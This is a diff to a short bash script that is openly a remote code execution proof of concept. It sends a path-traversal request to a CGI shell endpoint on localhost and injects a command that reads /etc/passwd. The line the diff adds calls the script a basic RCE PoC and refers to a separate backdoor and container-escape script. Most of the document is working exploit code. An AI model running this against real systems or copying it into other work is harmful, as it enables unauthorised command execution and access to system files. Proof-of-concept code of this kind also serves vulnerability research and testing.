@@ -1,4 +1,5 @@
 #!/bin/bash
+# This is a basic RCE PoC; for an exploit that integrates with container escape, see scripts/install_backdoor.sh
 host='localhost:3000'
 payload="cat /etc/passwd"
 curl "$host/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "A= | echo; $payload"
